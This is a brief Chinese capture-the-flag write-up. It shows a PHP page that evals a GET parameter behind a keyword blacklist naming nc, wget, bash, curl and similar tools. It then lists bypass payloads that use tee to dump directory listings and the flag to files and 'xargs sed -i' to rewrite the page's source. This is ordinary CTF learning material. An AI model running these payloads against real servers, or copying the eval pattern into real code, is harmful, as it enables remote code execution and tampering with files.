# 知识点
[https://blog.csdn.net/Kracxi/article/details/121997166](https://blog.csdn.net/Kracxi/article/details/121997166)
### tee
[https://www.runoob.com/linux/linux-comm-tee.html](https://www.runoob.com/linux/linux-comm-tee.html)
### xargs / sed
[https://blog.csdn.net/weixin_39731083/article/details/82495950](https://blog.csdn.net/weixin_39731083/article/details/82495950)
# 思路
```python
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|eval|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        echo('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    eval($c);
}
else{
    highlight_file(__FILE__);
}
?>
```
```python
方法一 利用tee保存为文件
?c=ls | tee 1
?c=cat /f149_15_h3r3 | tee 2
方法二 通过 ls | xargs sed -i "s/exec/system" 进行字符替换
ls | xargs sed -i "s/die/echo/"
ls | xargs sed -i "s/exec/system/"
?c=tac /f*
```
